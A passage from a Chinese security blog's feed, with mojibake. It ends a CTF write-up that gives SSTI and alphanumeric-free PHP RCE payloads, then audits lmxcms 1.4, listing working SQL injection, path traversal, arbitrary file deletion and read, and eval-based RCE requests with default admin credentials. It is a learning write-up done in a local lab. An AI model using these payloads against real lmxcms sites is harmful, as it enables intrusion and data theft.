1; i + 1 &lt; argc; i++) &#123;</span><br><span class="line">        if (strcmp(&quot;--HDdss&quot;, argv[i]) == 0) &#123;</span><br><span class="line">            execvp(argv[i + 1], &amp;argv[i + 1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¦ä½¿ç”¨--HDdsså‚æ•°æ‰§è¡Œå‘½ä»¤,å°±èƒ½è·å¾—flag</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static; /usr/bin/rev --HDdss cat /flag &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>å®˜wpä¹Ÿè¯´äº†ï¼Œå¯ä»¥å†…å­˜é©¬æ‰“æ— å›æ˜¾,åé¢åœ¨sstiä¸“é¢˜å†å»æ€»ç»“å§ï¼Œå·²è€å®æ±‚æ”¾è¿‡</p><h3 id="ã€æœªå®Œæˆã€‘23-ç¬¬äºŒåä¸‰ç« -å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰-å¤§ç»“å±€"><a href="#ã€æœªå®Œæˆã€‘23-ç¬¬äºŒåä¸‰ç« -å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰-å¤§ç»“å±€" class="headerlink" title="ã€æœªå®Œæˆã€‘23 ç¬¬äºŒåä¸‰ç«  å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰(å¤§ç»“å±€)"></a>ã€æœªå®Œæˆã€‘<strong>23 ç¬¬äºŒåä¸‰ç«  å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰(å¤§ç»“å±€)</strong></h3><h4 id="è€ƒç‚¹ï¼šjavaååºåˆ—åŒ–"><a href="#è€ƒç‚¹ï¼šjavaååºåˆ—åŒ–" class="headerlink" title="è€ƒç‚¹ï¼šjavaååºåˆ—åŒ–"></a>è€ƒç‚¹ï¼šjavaååºåˆ—åŒ–</h4><h3 id="24-ç•ªå¤–ç¯‡ï¼ˆ1ï¼‰æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ"><a href="#24-ç•ªå¤–ç¯‡ï¼ˆ1ï¼‰æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ" class="headerlink" title="24 ç•ªå¤–ç¯‡ï¼ˆ1ï¼‰æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ"></a>24 ç•ªå¤–ç¯‡ï¼ˆ1ï¼‰<strong>æ‘¸é‡‘å¶é‡FLAGï¼Œæ‹¼å°½å…¨åŠ›éš¾æˆ˜èƒœ</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç©å®¶éœ€è¦åœ¨é™å®šæ—¶é—´å†…ç ´è¯‘9ä½æ‘©æ–¯å¯†ç æ•°å­—åºåˆ—</span><br><span class="line">å·¦ä¾§æ˜¾ç¤ºéœ€è¦ç ´è¯‘çš„æ‘©æ–¯å¯†ç åºåˆ—</span><br><span class="line">å³ä¾§æä¾›æ•°å­—é”®ç›˜è¾“å…¥ç­”æ¡ˆ</span><br><span class="line">æ¯ä¸ªæ•°å­—å¯¹åº”ç‰¹å®šçš„æ‘©æ–¯å¯†ç å›¾æ¡ˆï¼ˆç‚¹Â·å’Œçº¿â”ï¼‰</span><br></pre></td></tr></table></figure><p>æ¥å—ä¼ é€’çš„æ•°æ®ï¼Œå†postè¯·æ±‚å›å»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/get_challenge?count=9&#x27;)</span><br><span class="line">.then(r =&gt; r.json())</span><br><span class="line">.then(d =&gt; &#123;</span><br><span class="line">    console.log(&#x27;answers:&#x27;, d.numbers, &#x27;token:&#x27;, d.token);</span><br><span class="line">return fetch(&#x27;/verify&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;answers: d.numbers, token: d.token&#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">.then(r =&gt; r.json())</span><br><span class="line">.then(data =&gt; console.log(&#x27;verify result:&#x27;, data));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251015105326728-1760512687700-83.png" alt="image-20251015105326728"></p><h3 id="25-ç•ªå¤–ç¯‡ï¼ˆ2ï¼‰è¿™æ˜¯â€¦Webshellï¼Ÿ"><a href="#25-ç•ªå¤–ç¯‡ï¼ˆ2ï¼‰è¿™æ˜¯â€¦Webshellï¼Ÿ" class="headerlink" title="25 ç•ªå¤–ç¯‡ï¼ˆ2ï¼‰è¿™æ˜¯â€¦Webshellï¼Ÿ"></a>25 ç•ªå¤–ç¯‡ï¼ˆ2ï¼‰<strong>è¿™æ˜¯â€¦Webshellï¼Ÿ</strong></h3><h4 id="è€ƒç‚¹ï¼šæ— å­—æ¯æ•°å­—rceç»•è¿‡"><a href="#è€ƒç‚¹ï¼šæ— å­—æ¯æ•°å­—rceç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šæ— å­—æ¯æ•°å­—rceç»•è¿‡"></a>è€ƒç‚¹ï¼šæ— å­—æ¯æ•°å­—rceç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">    $shell = $_GET[&#x27;shell&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;, $_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">        eval($shell);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ— å­—æ¯æ— æ•°å­—çš„rceç»•è¿‡,å¼‚æˆ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;($&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%aa&#125;);&amp;%ff=system&amp;%aa=env</span><br></pre></td></tr></table></figure><h3 id="26-ç•ªå¤–ç¯‡ï¼ˆ3ï¼‰è¿™æ˜¯â€¦Webshell-revenge"><a href="#26-ç•ªå¤–ç¯‡ï¼ˆ3ï¼‰è¿™æ˜¯â€¦Webshell-revenge" class="headerlink" title="26 ç•ªå¤–ç¯‡ï¼ˆ3ï¼‰è¿™æ˜¯â€¦Webshell?_revenge"></a><strong>26 ç•ªå¤–ç¯‡ï¼ˆ3ï¼‰è¿™æ˜¯â€¦Webshell?_revenge</strong></h3><h4 id="è€ƒç‚¹ï¼šrceç»•è¿‡"><a href="#è€ƒç‚¹ï¼šrceç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šrceç»•è¿‡"></a>è€ƒç‚¹ï¼šrceç»•è¿‡</h4><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ</a></p><p><a href="https://forum.butian.net/share/1048">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-RCEå…¨è¦†ç›–æ€»ç»“</a></p><p><img src="/../images/image-20251015102757340-1760512687700-82.png" alt="image-20251015102757340"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:7744/?shell=?&gt;&lt;?= `. /???/????????[@-[]`?&gt;</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">-----------110</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">env</span><br><span class="line">-----------110--</span><br></pre></td></tr></table></figure><h3 id="26-ç•ªå¤–ç¯‡ï¼ˆ4ï¼‰Moeç¬‘ä¼ ä¹‹çŒœçŒœçˆ†"><a href="#26-ç•ªå¤–ç¯‡ï¼ˆ4ï¼‰Moeç¬‘ä¼ ä¹‹çŒœçŒœçˆ†" class="headerlink" title="26 ç•ªå¤–ç¯‡ï¼ˆ4ï¼‰Moeç¬‘ä¼ ä¹‹çŒœçŒœçˆ†"></a>26 ç•ªå¤–ç¯‡ï¼ˆ4ï¼‰<strong>Moeç¬‘ä¼ ä¹‹çŒœçŒœçˆ†</strong></h3><p>ç”Ÿæˆçš„éšæœºæ•°å­—å­˜å‚¨åœ¨randomnumberï¼Œç›´æ¥ä¿®æ”¹æˆ–è€…è®¿é—®éƒ½å¯ä»¥</p><p><img src="/../images/image-20251015143332428-1760512687700-86.png" alt="image-20251015143332428"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">randomNumber = 50;</span><br></pre></td></tr></table></figure><h3 id="ã€æœªå®Œæˆã€‘27-ç•ªå¤–ç¯‡ï¼ˆ5ï¼‰é™„åŠ æŒ‘æˆ˜"><a href="#ã€æœªå®Œæˆã€‘27-ç•ªå¤–ç¯‡ï¼ˆ5ï¼‰é™„åŠ æŒ‘æˆ˜" class="headerlink" title="ã€æœªå®Œæˆã€‘27 ç•ªå¤–ç¯‡ï¼ˆ5ï¼‰é™„åŠ æŒ‘æˆ˜"></a>ã€æœªå®Œæˆã€‘27 ç•ªå¤–ç¯‡ï¼ˆ5ï¼‰<strong>é™„åŠ æŒ‘æˆ˜</strong></h3><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è™½ç„¶è¯´æ˜¯æ–°ç”Ÿèµ›ï¼Œååºåˆ—åŒ–å•Šè¿™ç§çŸ¥è¯†ç‚¹è¿˜æ˜¯ä¸å¤Ÿå…¨é¢ï¼Œå‡†å¤‡å¼€ä¸€ä¸ªã€Šé‡ç”Ÿä¹‹æˆ‘è¦å½“webç³•æ‰‹ã€‹ç³»åˆ—ï¼Œå°†ç¼ºå°‘çš„çŸ¥è¯†ç‚¹ç»™è¡¥ä¸Š</span><br><span class="line">javaé‚£ä¸€å—ä¹Ÿå¾—ï¼Œå¼€å§‹å­¦å¼€å§‹è¡¥äº†ï¼Œã€è¿™ä¸¤é¢˜ç­‰è¡¥äº†javaååºåˆ—åŒ–å†å›å¤´çœ‹çœ‹å§ã€‘</span><br><span class="line">è‡ªå·±è¿˜æ˜¯å¤ªèœï¼Œå¸Œæœ›çœèµ›çœŸçš„è¡¥è¯çˆ†é›¶å“‡ï¼Œåˆ°æ—¶å€™å¤§å½©ç¬”çš„æˆ‘ä¸æ•¢è·Ÿå¤§å¸ˆå‚…ä»¬é¢åŸºäº†éƒ½ã€‚å†™çš„ä¸å¥½ï¼Œæ¬¢è¿å’Œå¸ˆå‚…ä»¬äº¤æµå­¦ä¹ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹phpcmsä»£ç å®¡è®¡</title>
      <link href="/posts/12382.html"/>
      <url>/posts/12382.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å†™åœ¨å‰é¢ï¼šåœ¨å„ä½å¤§å¸ˆå‚…çš„æŠ•å–‚ä¸‹ï¼Œæ¶¨äº†å¾ˆå¤šè§è¯†æ‰€ä»¥å¼€å§‹äº†ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿç³»åˆ—ã€‚</span><br><span class="line">è¿™ä¸€æœŸæ˜¯è·Ÿsuæˆ˜é˜Ÿçš„_sun_Â·empty.å¸ˆå‚…å’Œtimelineæˆ˜é˜Ÿçš„æ‰¬ä¸˜å¸ˆå‚…çš„ä¸€æ¬¡awdè®­ç»ƒèµ›ï¼Œåœ¨_sun_Â·empty.è¯´è¦å¤ç›˜æ‰æœ‰æ„ä¹‰çš„å»ºè®®ä¸‹ã€‚</span><br><span class="line">å†™äº†è¿™ç¯‡ä¸Šå¹´çºªçš„cmsä»£ç å®¡è®¡ï¼Œå¦‚æ–‡ç« æœ‰ä»»ä½•é—®é¢˜å¯ä»¥è”ç³»æˆ‘è¿›è¡Œäº¤æµï¼Œæ„Ÿè°¢è§‚çœ‹</span><br></pre></td></tr></table></figure><h1 id="lmxcms1-4ï¼Œä»£ç å®¡è®¡â€“å¤ç°"><a href="#lmxcms1-4ï¼Œä»£ç å®¡è®¡â€“å¤ç°" class="headerlink" title="lmxcms1.4ï¼Œä»£ç å®¡è®¡â€“å¤ç°"></a>lmxcms1.4ï¼Œä»£ç å®¡è®¡â€“å¤ç°</h1><p>åœ¨awdè®­ç»ƒèµ›ä¸­é‡åˆ°äº†è¿™å¥—cmsï¼Œäºæ˜¯æ‰“ç®—å­¦ä¹ å®¡è®¡ä¸€æ‰‹</p><p>æ¯ç§æ¼æ´åªæ‰¾äº†ä¸€ä¸ªä»£è¡¨å­¦ä¹ ä¸ä»£è¡¨åªè¦ä¸€ä¸ªï¼Œå®é™…çš„æ¼æ´ç‚¹æœ‰å¾ˆå¤š</p><p>å‚è€ƒäº†å¸ˆå‚…ä»¬çš„åšå®¢,å…ˆåœ¨è¿™é‡Œè´´ä¸€æ‰‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_45764684/article/details/130962179</span><br><span class="line">https://blog.csdn.net/qq_38154820/article/details/129836774</span><br><span class="line">https://xz.aliyun.com/news/14971</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¸¸è§„æ­å»ºcmsï¼šphpstudy+phpstorm,apache2.4.39+MySQL5.7.26,php5.3.29</span><br><span class="line"></span><br><span class="line">åœ¨å°çš®é¢æ¿æ­å»ºä¹‹åï¼Œç›´æ¥è®¿é—®/installï¼Œæ ¹æ®æµç¨‹è®¾è®¡æ•°æ®åº“ï¼Œåå°è´¦å·å¯†ç å°±å¥½äº†</span><br><span class="line"></span><br><span class="line">åå°é»˜è®¤å¯†ç  admin/123456</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233911216.png" alt="image-20251010233911216"></p><h3 id="cmsè¯·æ±‚å¤„ç†æ ¼å¼"><a href="#cmsè¯·æ±‚å¤„ç†æ ¼å¼" class="headerlink" title="cmsè¯·æ±‚å¤„ç†æ ¼å¼"></a>cmsè¯·æ±‚å¤„ç†æ ¼å¼</h3><p>è¿›æ¥å…ˆçœ‹åˆ°å‰å°å…¥å£æ–‡ä»¶</p><p>é…ç½®æ–‡ä»¶ï¼š&#x2F;inc&#x2F;config.inc.php</p><p>åˆå§‹åŒ–æ–‡ä»¶ï¼š&#x2F;inc&#x2F;run.inc.php</p><p><img src="/../images/image-20251010225942615.png" alt="image-20251010225942615"></p><p><img src="/../images/image-20251010230623939.png" alt="image-20251010230623939"></p><p>å…¨å±€ã€ctrl+shift+alt+nã€‘æœrun()</p><p><img src="/../images/image-20251010230743576.png" alt="image-20251010230743576"></p><p>åˆ†åˆ«ä¼ å‚æ˜¯ç±»åï¼Œæ–¹æ³•å</p><p><a href="http://127.0.0.1/lmxcms1.4/admin.php?m=xx">?m&#x3D;xx</a>ç±»å&amp;a&#x3D;xxæ–¹æ³•</p><h3 id="åå°SQLæ³¨å…¥æ¼æ´"><a href="#åå°SQLæ³¨å…¥æ¼æ´" class="headerlink" title="åå°SQLæ³¨å…¥æ¼æ´"></a>åå°SQLæ³¨å…¥æ¼æ´</h3><p>æ¼æ´ç‚¹ï¼šå‚æ•°å¯æ§ï¼Œå‚ä¸æ‰§è¡Œsqlè¯­å¥</p><p>åœ¨bookaction.class.php,å¯æ§å‚æ•°åid,è¿›å…¥getReplyå‡½æ•°<img src="/../images/image-20251010231637489.png" alt="image-20251010231637489"></p><p>getReplyâ€”&gt;selectModelâ€”&gt;selectDB</p><p><img src="/../images/image-20251010232525224.png" alt="image-20251010232525224"></p><p><img src="/../images/image-20251010232529755.png" alt="image-20251010232529755"></p><p><img src="/../images/image-20251010232533337.png" alt="image-20251010232533337"></p><p>å¯ä»¥å‘ç°å°†idä¼ è¿›å»ï¼Œä¸€å±‚è§£ä¸€å±‚åœ¨selectDBæ‰§è¡Œäº†sqlè¯­å¥</p><p>å¸¸è§„è°ƒè¯•æ˜¯ä¸ä¼šçœ‹åˆ°sqlè¯­å¥ï¼Œåœ¨æ‰§è¡Œä¹‹åæ·»åŠ echo $sql;æ¥çœ‹å…·ä½“çš„è°ƒè¯•æƒ…å†µ</p><p><img src="/../images/image-20251010232925033.png" alt="image-20251010232925033"></p><p>æ ¹æ®å‰é¢çŸ¥é“çš„è¯·æ±‚æ ¼å¼ï¼Œç»™idéšä¾¿ä¼ ä¸ªå‚æ•°ï¼Œæ³¨æ„æ–¹æ³•åæ˜¯ä¸€å¼€å§‹çš„reply()</p><p>ã€æ³¨æ„è¿™ä¸ªæ˜¯adminä¸‹çš„åå°æ¼æ´ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=book&amp;a=reply&amp;id=1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233433548.png" alt="image-20251010233433548"></p><p>æœ‰å›æ˜¾ï¼ŒæŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=Book&amp;a=reply&amp;id=1) and updatexml(0,concat(0x7e,user()),1)--+</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010233633278.png" alt="image-20251010233633278"></p><h3 id="å‰å°SQLæ³¨å…¥æ¼æ´"><a href="#å‰å°SQLæ³¨å…¥æ¼æ´" class="headerlink" title="å‰å°SQLæ³¨å…¥æ¼æ´"></a>å‰å°SQLæ³¨å…¥æ¼æ´</h3><p>æ¼æ´ç‚¹ï¼šåœ¨è¿‡æ»¤å‡½æ•°ä¹‹å‰è¿›è¡Œurlè§£ç ã€ä¸ä¸¥æ ¼ã€‘</p><p>æ‰¾åˆ°nameå‚æ•°ï¼Œç”±dataæ¥ï¼Œè¿½è¸ªpæœ‰postå’Œgetä¼ è¾“</p><p><img src="/../images/image-20251011103134787.png"></p><p>æœ‰postå’Œgetä¼ è¾“ï¼Œè¯´æ˜å‚æ•°å¯æ§ï¼Œå›åˆ°å¤„ç†nameæ•°æ®å‡½æ•°</p><p><img src="/../images/image-20251011103209563.png"></p><p>ç»§ç»­è·Ÿè¿›getNameData</p><p><img src="/../images/image-20251011103412666.png"></p><p>â€“&gt;onemodel<img src="/../images/image-20251011103422783.png" alt="image-20251011103422783"></p><p>â€”&gt;oneDB,åœ¨oneDBä¸­æ‰§è¡Œäº†sqlè¯­å¥ï¼Œ</p><p><img src="/../images/image-20251011103459787.png"></p><p>åŒæ—¶åœ¨på¤„ç†dataçš„æ—¶å€™ï¼Œå‘ç°äº†è¿‡æ»¤éæ³•æäº¤ä¿¡æ¯å‡½æ•°filte_sql<img src="/../images/image-20251011103845173.png"></p><p>ä½†æ˜¯å›åˆ°ä¸»å‡½æ•°å¯ä»¥çœ‹åˆ°æœ‰urldecode å¹¶ä¸”æ˜¯åœ¨æ‰§è¡Œsqlè¯­å¥ä¹‹å</p><p><img src="/../images/image-20251011105045779.png" alt="image-20251011105045779"></p><p>äºŒæ¬¡ç¼–ç æ³¨å…¥ï¼šå½“å¯¹nameä¼ è¾“æ•°æ®æ—¶ä¼šå…ˆè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œå¦‚æœå°†payloadäºŒæ¬¡ç¼–ç ï¼Œè§£äº†ä¸€æ¬¡ä¹‹åè¿˜æœ‰ä¸€å±‚urlç¼–ç ï¼Œfilte_sqlå°±è¿‡æ»¤ä¸äº†æ¶æ„payloadï¼Œäº§ç”Ÿæ¼æ´äº†</p><p>ã€æ³¨æ„ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çœ‹ä»£ç çš„æµç¨‹æ˜¯è¦åè¿‡æ¥çš„ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?m=tags&amp;name=%25%36%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%30%25%32%33</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011105625012.png" alt="image-20251011105625012"></p><h3 id="åå°ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#åå°ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶åˆ é™¤"></a>åå°ä»»æ„æ–‡ä»¶åˆ é™¤</h3><p>æ¼æ´ç‚¹ï¼šunlinkå‡½æ•°</p><p>å…¨å±€æœç´¢è°ƒç”¨æƒ…å†µ</p><p><img src="/../images/image-20251011111212814.png" alt="image-20251011111212814"></p><p>delone</p><p><img src="/../images/image-20251011111317078.png" alt="image-20251011111317078"></p><p>delbackdbè°ƒç”¨äº†deloneï¼Œå‘ç°filenameæ˜¯getå¯æ§å‚æ•°</p><p><img src="/../images/image-20251011111339902.png" alt="image-20251011111339902"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.phpï¼Ÿm=Backdb&amp;a=delbackdb&amp;filename=../../install/1.txt</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011111727606.png" alt="image-20251011111727606"></p><h3 id="åå°ä»»æ„æ–‡ä»¶è¯»å–"><a href="#åå°ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶è¯»å–"></a>åå°ä»»æ„æ–‡ä»¶è¯»å–</h3><p>æ¼æ´ç‚¹æ–‡ä»¶è¯»å–å‡½æ•°file_get_contents</p><p><img src="/../images/image-20251011113130400.png" alt="image-20251011113130400"></p><p>æŸ¥çœ‹getconè°ƒç”¨æƒ…å†µ</p><p><img src="/../images/image-20251011113321090.png" alt="image-20251011113321090"></p><p>dirå‚æ•°å¯æ§ï¼Œåœ¨å½“å‰editfileç›®å½•è®¿é—®å°±èƒ½è¿›è¡Œè¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lmxcms//admin.php?m=Template&amp;a=editfile&amp;dir=admin/AD//ad.html</span><br><span class="line"></span><br><span class="line">http://lmxcms//admin.php?m=Template&amp;a=editfile&amp;dir=../inc//db.inc.php</span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ€åæŸ¥çœ‹æ˜¯&#x2F;&#x2F;</p><p><img src="/../images/image-20251011114801112.png" alt="image-20251011114801112"></p><h3 id="åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3><p>æ¼æ´ç‚¹ï¼šfile_put_contentså‡½æ•°</p><p>åœ¨ä»»æ„è¯»å–å½“ä¸­ä¹Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ </p><p><img src="/../images/image-20251011115339998.png" alt="image-20251011115339998"></p><p><img src="/../images/image-20251011115404627.png" alt="image-20251011115404627"></p><p>poståˆ†åˆ«ä¼ å…¥æ–‡ä»¶åç§°è·Ÿå†…å®¹å°±å¥½äº†ã€æ²¡æœ‰æµ‹æˆåŠŸã€‘</p><p><img src="/../images/image-20251011143322125.png" alt="image-20251011143322125"></p><p>é»‘ç›’çš„åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯ä»¥è‡ªè¡Œä¿®æ”¹æ–‡ä»¶ä¸Šä¼ ç±»å‹</p><p><img src="/../images/image-20251011143422118.png" alt="image-20251011143422118"></p><p>ä¸Šä¼ æ„é€ å¥½çš„phpæ–‡ä»¶å°±å¥½äº†</p><p><img src="/../images/image-20251011143530032.png" alt="image-20251011143530032"></p><h3 id="åå°å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#åå°å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="åå°å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>åå°å‘½ä»¤æ‰§è¡Œæ¼æ´</h3><p>æ¼æ´ç‚¹ï¼šsqlå†™é©¬å¯¼è‡´rec</p><p>æ‰¾åˆ°evalå‡½æ•° è·Ÿè¿›å‚æ•°getä¼ å‚cidå¯æ§</p><p><img src="/../images/image-20251011144452040.png" alt="image-20251011144452040"></p><p>èµ°è¿›caijidataoneå‡½æ•°ï¼Œå‘ç°æ‰äº†cj_data_tab()</p><p><img src="/../images/image-20251011144548654.png" alt="image-20251011144548654"></p><p>æŸ¥è¯¢çš„æ˜¯cj_dataè¡¨</p><p><img src="/../images/image-20251011144730710.png" alt="image-20251011144730710"></p><p><img src="/../images/image-20251011144741088.png" alt="image-20251011144741088"></p><p><img src="/../images/image-20251011144744835.png" alt="image-20251011144744835"></p><p>é‚£ä¹ˆåªè¦åœ¨cj_dataè¡¨ä¸­æ’å…¥ï¼Œæ¶æ„ä»£ç ï¼Œåœ¨æ‰§è¡ŒsqlæŸ¥è¯¢æ‰§è¡Œäº†æ¶æ„ä»£ç å®ç°å‘½ä»¤æ‰§è¡Œ,åå°æ‰¾åˆ°å¯ä»¥æ‰§è¡Œsqlè¯­å¥çš„åœ°æ–¹</p><p><img src="/../images/image-20251011150025893.png" alt="image-20251011150025893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lmxcms`.`lmx_cj_data` (`id`, `lid`, `data`, `uid`, `url`, `time`) VALUES (3, 4, &#x27;phpinfo()&#x27;, 33, &#x27;a&#x27;, 5);</span><br><span class="line"></span><br><span class="line">/admin.php?m=Acquisi&amp;a=showCjData&amp;id=1&amp;lid=4&amp;cid=3</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251011150355759.png" alt="image-20251011150355759"></p><p><img src="/../images/image-20251011145940775.png" alt="image-20251011145940775"></p><h3 id="awdæ€è·¯"><a 